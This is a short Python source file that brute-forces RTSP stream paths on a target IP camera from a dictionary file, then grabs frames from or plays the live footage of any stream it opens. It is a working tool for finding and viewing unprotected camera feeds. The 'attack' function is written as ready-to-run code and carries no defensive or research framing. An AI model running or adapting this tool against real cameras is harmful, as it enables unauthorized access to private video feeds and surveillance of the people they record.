from cmath import log
from enum import Enum
from random import choices
import logging
import cv2
import time

def attack(ipaddr, port=554, dictionary = './rtsp_dict/tries.txt'):
    for trial in open(dictionary).readlines():
        tmp = trial.strip('\n')
        rtsp_url = f"rtsp://{ipaddr}:{port}/{tmp}"
        logging.info(f"trying {rtsp_url}")
        iok = test_avaliable(rtsp_url)
        if iok:
            print(f"found {rtsp_url}")
            return rtsp_url
        else:
            logging.info(f"failed {rtsp_url}")

# a version of capture that returns the frame and does not require fpath
def capture(rtsp_url, threshold=10):
    vid = cv2.VideoCapture(rtsp_url)
    if not vid.isOpened():
        print('rtsp url is not valid')
        return
    fail_cnt = 0
    while(fail_cnt<threshold):
        try:
            _, frame = vid.read()
            return frame
        except KeyboardInterrupt:
            break
        except Exception as e:
            logging.error(e)
            fail_cnt+=1
    return None

def test_avaliable(rtsp_url, threshold=10):
    vid = cv2.VideoCapture(rtsp_url)
    if not vid.isOpened():
        print('rtsp url is not valid')
        return
    fail_cnt = 0
    while(fail_cnt<threshold):
        try:
            _, frame = vid.read()
            return True
        except KeyboardInterrupt:
            break
        except Exception as e:
            logging.error(e)
            fail_cnt+=1
    return False


def play(rtsp_url, threshold=100):
    vid = cv2.VideoCapture(rtsp_url)
    if not vid.isOpened():
        print('rtsp url is not valid')
        return
    fail_cnt = 0
    while(fail_cnt<threshold):
        try:
            _, frame = vid.read()
            cv2.imshow('Footage', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(e)
            time.sleep(0.05)
            fail_cnt+=1
    
    vid.release()
    cv2.destroyAllWindows()
